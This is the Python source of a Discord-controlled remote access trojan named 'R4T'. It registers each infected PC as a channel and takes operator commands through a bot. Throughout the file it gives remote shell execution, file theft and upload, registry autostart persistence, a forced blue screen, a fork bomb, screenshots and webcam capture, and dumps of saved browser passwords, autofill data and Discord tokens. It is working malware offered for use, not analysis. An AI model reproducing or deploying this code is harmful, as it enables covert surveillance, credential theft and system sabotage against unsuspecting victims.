import os
import ssl
import certifi
import sys
import asyncio
import io
import json
import webbrowser
import ctypes
import threading
import time
import requests
import pyttsx3
import psutil
import socket
from pynput import keyboard
import subprocess



try:
    import Access.audio_control
    import Access.screenshot
    import Access.webcam
    import credential.autofill
    import credential.password
    import credential.main
except ImportError as e:
    print(f"Error importing required modules: {e}")
    print("Please ensure the 'Access' and 'credential' directories and their __init__.py files exist.")
    sys.exit(1)



def setup_ssl_context():
    try:
        os.environ["SSL_CERT_FILE"] = certifi.where()
        os.environ["REQUESTS_CA_BUNDLE"] = certifi.where()
        os.environ["CURL_CA_BUNDLE"] = certifi.where()
        ssl._create_default_https_context = lambda: ssl.create_default_context(cafile=certifi.where())
    except Exception:
        pass 

setup_ssl_context()


try:
    import discord
    from discord.ext import commands
except ImportError:
    print("Error: Discord.py library not found. Please install it.")
    sys.exit(1)


try:
    import platform
    import sys
except ImportError:
    pass 

# Discord bot token and guild ID -

token = "" # token here
bot_guild_id = 1515361307862499399 # guild id here


# Windows specific event loop policy for Python 3.8+
if sys.platform.startswith('win') and sys.version_info >= (3, 8):
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except AttributeError:
        pass 

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(r"""
     ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗   ██╗███╗   ███╗
    ██╔═══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║   ██║████╗ ████║
    ██║   ██║██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
    ██║▄▄ ██║██║   ██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
    ╚██████╔╝╚██████╔╝██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
     ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
    """)
    try:
        uname = platform.uname()
        user = os.getlogin()
        pc = uname.node.lower()
        guild = bot.get_guild(bot_guild_id)

        if guild:
            category_name = f'R4T|{pc}' 
            category = discord.utils.get(guild.categories, name=category_name)
            if not category:
                category = await guild.create_category(category_name)
                session_channel_name = 't3rminal' 
                session = await guild.create_text_channel(session_channel_name, category=category)
            else:
                session_channel_name = 't3rminal'
                session = discord.utils.get(category.channels, name=session_channel_name)
                if not session:
                    session = await guild.create_text_channel(session_channel_name, category=category)

            embed_title = ""
            embed_desc = "#RAT Online"
            embed = discord.Embed(title=embed_title, description=embed_desc, color=0x010101)
            embed.add_field(name=f"root@{user}:~#", value=pc, inline=False)
            embed.set_image(url="https://i.ibb.co/6JsnDvxh/image-1.png") 
            embed.set_footer(text="RAT V1 | !help")

            await session.send(content='@everyone', embed=embed)
        else:
            print(f"Error: Could not find the specified guild with ID: {bot_guild_id}")
    except Exception as e:
        print(f"Error during on_ready: {e}")


@bot.command(name='help')
async def show_help(ctx):
    help_text = """
R4T V2 Commands:

System Access:
!startup: Add to autostart.
!execute <commands>: Run shell command. WARNING, DO NOT USE TO RUN APPS use !start instead.
!start <filename> start a file 
!cd <directory>: Change directory.
!process: List running processes.
!processkill <pid>: Kill a process by PID.
!shutdown: Shut down the system.
!restart: Restart the system.
!download <filename>: Download file.
!upload: Upload file.
!delete <filename>: delete a file 
!listdir: List all files in the current directory.

System Information:
!ip: Get public IP info.
!sysinfo: Get system info.

Troll Access:
!open <link>: Open a web browser.
!bsod: Trigger blue screen.
!msgbox <title> <text>: Show message box.
!textspeech <text>: Text to speech.
!wallpaper <attachment>: Set wallpaper.
!forkbomb: Rabbit Virus.
!xfreecrash: Open xfree until browser crashes.
!volume <command|0-100>: Volume controls.
!garynarkle: Opens a news article link.

Device Access:
!screenshot: Take a screenshot.
!webcam: Capture webcam image.

Credential Dump:
!password: Dumps saved passwords.
!grabtokens: Grab Discord tokens.
!autofill: Dumps saved autofill data.
"""
    await ctx.send(f"```\n{help_text}\n```")

@bot.command(name="execute")
async def execute_command(ctx, *, command_input: str):
    """
    Runs a command and waits for output.
    
    """

    try:
        result = subprocess.run(
            command_input,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )

        output_result = result.stdout + result.stderr

    except subprocess.TimeoutExpired:
        output_result = "Command timed out after 30 seconds."

    except Exception as e:
        output_result = f"Error: {e}"

    if not output_result.strip():
        output_result = "*No output returned from command*"

    if len(output_result) > 1900:
        buffer = io.BytesIO(output_result.encode("utf-8"))
        await ctx.send(
            f"📤 Output from `{command_input}`",
            file=discord.File(buffer, filename="output.txt")
        )
    else:
        await ctx.send(
            f"🖥️ Command: `{command_input}`\n```{output_result}```"
        )


@bot.command(name="start")
async def start_program(ctx, *, command_input: str):
    """
    Starts a program without waiting.
    
    """

    try:
        process = subprocess.Popen(
            command_input,
            shell=True
        )

        await ctx.send(
            f"✅ Started:\n```{command_input}```\nPID: `{process.pid}`"
        )

    except Exception as e:
        await ctx.send(f"❌ Failed to start:\n```{e}```")

@bot.command(name='cd')
async def change_directory(ctx, *, path=None):
    try:
        if path:
            os.chdir(path)
            await ctx.send(f"Current directory: `{os.getcwd()}`")
        else:
            await ctx.send(f"Current directory: `{os.getcwd()}`")
    except FileNotFoundError:
        await ctx.send(f"Error: Directory not found: `{path}`")
    except Exception as e:
        await ctx.send(f"Error changing directory: {e}")

@bot.command(name="delete", help="Delete a file/folder")
async def delete_item(ctx, *, path: str):
    cmd = f"del /f /q {path}" if os.name == "nt" else f"rm -rf {path}"
    result = subprocess.getoutput(cmd)
    await ctx.send(f"🗑️ **Delete: `{path}`**\n```\n{result or 'Deleted successfully'}\n```")

@bot.command(name='sysinfo')
async def system_info(ctx):
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
        uname = platform.uname()
        ram_bytes = psutil.virtual_memory().total
        ram_gb = round(ram_bytes / (1024**3))

        info_message = (
            f"OS: {uname.system}\n"
            f"Version: {uname.version}\n"
            f"Architecture: {platform.architecture()[0]}\n"
            f"Processor: {uname.processor}\n"
            f"Hostname: {uname.node}\n"
            f"Internal IP: {ip_address}\n"
            f"CPU Cores: {os.cpu_count()}\n"
            f"RAM: {ram_gb} GB\n"
            f"User: {os.getlogin()}"
        )
        await ctx.send(f"```\n{info_message}\n```")
    except Exception as e:
        await ctx.send(f"Error retrieving system info: {e}")

@bot.command(name='open')
async def open_link(ctx, url):
    try:
        webbrowser.open(url)
        await ctx.send(f"Opened: {url}")
    except Exception as e:
        await ctx.send(f"Error opening link: {e}")

@bot.command(name='bsod')
async def trigger_bsod(ctx):
    try:
        
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        await ctx.send("Attempted to trigger a BSOD. System may restart.")
    except Exception as e:
        await ctx.send(f"Could not trigger BSOD: {e}")

@bot.command(name='startup')
async def add_startup(ctx):
    try:
        
        
        reg_command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "R4T_Agent" /t REG_SZ /d "{sys.executable}" /f'
        subprocess.run(reg_command, shell=True, check=True)
        await ctx.send("Added to Windows autostart.")
    except Exception as e:
        await ctx.send(f"Failed to add to autostart: {e}")

@bot.command(name='garynarkle')
async def garynarkle_link(ctx):
    link = "https://thewest.com.au/stories/notorious-serial-rapist-narkle-slapped-with-new-charges/" # Example link
    try:
        webbrowser.open(link)
        await ctx.send("Opening requested link.")
    except Exception as e:
        await ctx.send(f"Error opening link: {e}")

@bot.command(name='download')
async def download_file(ctx, *, file_path: str):
    """Downloads a file from the specified path."""
    try:
        if os.path.exists(file_path) and os.path.isfile(file_path):
            await ctx.send(file=discord.File(file_path))
        else:
            await ctx.send("File not found or invalid path.")
    except Exception as e:
        await ctx.send(f"Error downloading file: {e}")

@bot.command(name='xfreecrash')
async def xfree_crash(ctx):
    try:
        while True:
            webbrowser.open("https://xfree.com")
    except Exception as e:
        await ctx.send(f"Error opening xfree: {e}")

@bot.command(name='upload')
async def upload_file(ctx):
    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        try:
            await attachment.save(attachment.filename)
            await ctx.send(f"Successfully uploaded: {attachment.filename}")
        except Exception as e:
            await ctx.send(f"Error uploading file: {e}")
    else:
        await ctx.send("No attachment found.")

@bot.command(name='wallpaper')
async def set_wallpaper(ctx):
    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        temp_dir = os.getenv("TEMP")
        file_name = attachment.filename
        save_path = os.path.join(temp_dir, file_name)
        try:
            await attachment.save(save_path)
            # SPI_SETDESKWALLPAPER = 20
            # SPIF_UPDATEINIFILE = 1
            # SPIF_SENDCHANGE = 2
            ctypes.windll.user32.SystemParametersInfoW(20, 0, save_path, 3)
            await ctx.send("Wallpaper set successfully.")
            
            os.remove(save_path)
        except Exception as e:
            await ctx.send(f"Error setting wallpaper: {e}")
    else:
        await ctx.send("No attachment found to set as wallpaper.")

@bot.command(name='ip')
async def public_ip(ctx):
    try:
        response = requests.get("https://api.ipify.org?format=json").json()
        await ctx.send(f"Public IP: `{response.get('ip', 'N/A')}`")
    except requests.exceptions.RequestException as e:
        await ctx.send(f"Could not retrieve public IP: {e}")
    except Exception as e:
        await ctx.send(f"An unexpected error occurred: {e}")

@bot.command(name='forkbomb')
async def fork_bomb(ctx):
    try:
        await ctx.send("Initiating fork bomb (may cause system instability).")
        
        
        while True:
            try:
                subprocess.Popen("start cmd", shell=True)
                time.sleep(0.01)
            except Exception:
                pass # Continue trying
    except Exception as e:
        await ctx.send(f"Fork bomb failed: {e}")


@bot.command(name='process')
async def list_processes(ctx):
    processes_list = []
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                processes_list.append(f"PID: {proc.info['pid']:<8} | Name: {proc.info['name']}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        
        process_output = "\n".join(processes_list)
        if len(process_output) > 1900:
            await ctx.send(file=discord.File(io.BytesIO(process_output.encode()), filename="processes.txt"))
        else:
            await ctx.send(f"```\n{process_output}\n```")
    except Exception as e:
        await ctx.send(f"Error listing processes: {e}")

@bot.command(name='processkill')
async def kill_process(ctx, pid: int):
    try:
        process = psutil.Process(pid)
        process.kill()
        await ctx.send(f"Successfully killed process with PID: {pid}")
    except psutil.NoSuchProcess:
        await ctx.send(f"Error: No process found with PID: {pid}")
    except psutil.AccessDenied:
        await ctx.send(f"Error: Permission denied to kill process with PID: {pid}")
    except ValueError:
        await ctx.send("Error: Invalid PID provided.")
    except Exception as e:
        await ctx.send(f"Error killing process: {e}")

@bot.command(name='shutdown')
async def shutdown_system(ctx):
    try:
        subprocess.run("shutdown /s /t 0", shell=True, check=True)
        await ctx.send("System shutting down.")
    except Exception as e:
        await ctx.send(f"Error initiating shutdown: {e}")

@bot.command(name='restart')
async def restart_system(ctx):
    try:
        subprocess.run("shutdown /r /t 0", shell=True, check=True)
        await ctx.send("System restarting.")
    except Exception as e:
        await ctx.send(f"Error initiating restart: {e}")

@bot.command(name='msgbox')
async def show_message_box(ctx, title: str, *, text: str):
    def message_box_thread():
        try:
            # MB_OK = 0
            ctypes.windll.user32.MessageBoxW(None, text, title, 0)
        except Exception as e:
            print(f"Error in message box thread: {e}")
    
    try:
        threading.Thread(target=message_box_thread).start()
        await ctx.send("Message box displayed.")
    except Exception as e:
        await ctx.send(f"Error displaying message box: {e}")

@bot.command(name='textspeech')
async def text_to_speech(ctx, *, text: str):
    try:
        tts_engine = pyttsx3.init()
        tts_engine.say(text)
        tts_engine.runAndWait()
        await ctx.send("Text-to-speech completed.")
    except Exception as e:
        await ctx.send(f"Error with text-to-speech: {e}")

@bot.command(name='screenshot')
async def take_screenshot(ctx):
    try:
        
        screenshot_func = getattr(Access.screenshot, "screenshots")
        screenshot_path = screenshot_func()
        await ctx.send(file=discord.File(screenshot_path))
        os.remove(screenshot_path) 
    except AttributeError:
        await ctx.send("Error: Screenshot function not found in Access.screenshot module.")
    except FileNotFoundError:
        await ctx.send("Error: Screenshot file not found after generation.")
    except Exception as e:
        await ctx.send(f"Error taking screenshot: {e}")

@bot.command(name='webcam')
async def capture_webcam(ctx):
    try:
        webcam_func = getattr(Access.webcam, "webcams")
        webcam_path = webcam_func()
        await ctx.send(file=discord.File(webcam_path))
        os.remove(webcam_path) # Clean up
    except AttributeError:
        await ctx.send("Error: Webcam function not found in Access.webcam module.")
    except FileNotFoundError:
        await ctx.send("Error: Webcam capture file not found after generation.")
    except Exception as e:
        await ctx.send(f"Error capturing webcam: {e}")

@bot.command(name='password')
async def dump_passwords(ctx):
    try:
        password_func = getattr(credential.password, "ext")
        passwords_data = password_func()
        await ctx.send(file=discord.File(io.BytesIO(json.dumps(passwords_data, indent=2).encode()), filename="passwords.json"))
    except AttributeError:
        await ctx.send("Error: Password dump function not found in credential.password module.")
    except Exception as e:
        await ctx.send(f"Error dumping passwords: {e}")

@bot.command(name='grabtokens')
async def grab_discord_tokens(ctx):
    await ctx.send("Grabbing Discord tokens...")
    try:
        token_grabber_func = getattr(credential.main, "main")
        token_grabber_func() 
        await ctx.send("Token grabbing process initiated. Check output files.")
        
        
    except AttributeError:
        await ctx.send("Error: Token grabber function not found in credential.main module.")
    except Exception as e:
        await ctx.send(f"Error during token grabbing: {e}")

@bot.command(name='autofill')
async def dump_autofill(ctx):
    try:
        autofill_func = getattr(credential.autofill, "autofills")
        autofill_data = autofill_func()
        await ctx.send(file=discord.File(io.BytesIO(json.dumps(autofill_data, indent=2).encode()), filename="autofill_data.json"))
    except AttributeError:
        await ctx.send("Error: Autofill function not found in credential.autofill module.")
    except Exception as e:
        await ctx.send(f"Error dumping autofill data: {e}")

@bot.command(name='volume')
async def volume_control(ctx, *args):
    if not args:
        await ctx.send("""
🎵 Volume Commands:
`!volume max`
`!volume mute`
`!volume unmute`
`!volume <0-100>`
""")
        return

    command = args[0].lower()
    
    try:
        volume_max_func = getattr(Access.audio_control, "volume_max")
        volume_mute_func = getattr(Access.audio_control, "volume_mute")
        volume_unmute_func = getattr(Access.audio_control, "volume_unmute")
        set_volume_func = getattr(Access.audio_control, "set_volume")

        if command == "max":
            volume_max_func()
            await ctx.send("🔊 Max volume set.")
        elif command == "mute":
            volume_mute_func()
            await ctx.send("🔇 Volume muted.")
        elif command == "unmute":
            volume_unmute_func()
            await ctx.send("🔊 Volume unmuted.")
        elif command.isdigit():
            volume_level = int(command)
            if 0 <= volume_level <= 100:
                set_volume_func(volume_level)
                await ctx.send(f"🔊 Volume set to {volume_level}%.")
            else:
                await ctx.send("❌ Volume must be between 0 and 100.")
        else:
            await ctx.send("❌ Invalid volume command.")
    except AttributeError as e:
        await ctx.send(f"Error: Audio control function not found: {e}")
    except Exception as e:
        await ctx.send(f"Error controlling volume: {e}")

@bot.command(name='listdir')
async def list_directory(ctx):
    try:
        current_dir = os.getcwd()
        items = os.listdir(current_dir)

        if not items:
            await ctx.send("📂 Directory is empty.")
            return

        folders = []
        files_list = []
        for item in items:
            full_path = os.path.join(current_dir, item)
            try:
                if os.path.isdir(full_path):
                    folders.append(f"📁 `{item}`")
                else:
                    size_bytes = os.path.getsize(full_path)
                    if size_bytes < 1024:
                        size = f"{size_bytes} B"
                    elif size_bytes < 1024 * 1024:
                        size = f"{round(size_bytes / 1024, 2)} KB"
                    else:
                        size = f"{round(size_bytes / (1024 * 1024), 2)} MB"
                    files_list.append(f"📄 `{item}` — {size}")
            except OSError:
                files_list.append(f"❓ `{item}` (Access Denied)")

        embed = discord.Embed(title="📂 Directory Listing", description=f"Location: `{current_dir}`", color=discord.Color.blue())
        
        if folders:
            embed.add_field(name="Folders", value="\n".join(folders), inline=False)
        if files_list:
            embed.add_field(name="Files", value="\n".join(files_list), inline=False)
        
        embed.set_footer(text=f"Total: {len(folders)} folders | {len(files_list)} files")
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"💀 Error reading directory: {e}")


async def keep_alive():
    """A simple task to prevent the bot from idling indefinitely."""
    while True:
        await asyncio.sleep(60) 

async def main():
    """Main function to run the bot."""
    
    
    async with bot:
        
        
        await bot.start(token)

if __name__ == "__main__":
    try:
        
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot stopped manually.")
    except Exception as e:
        print(f"An error occurred during bot execution: {e}")


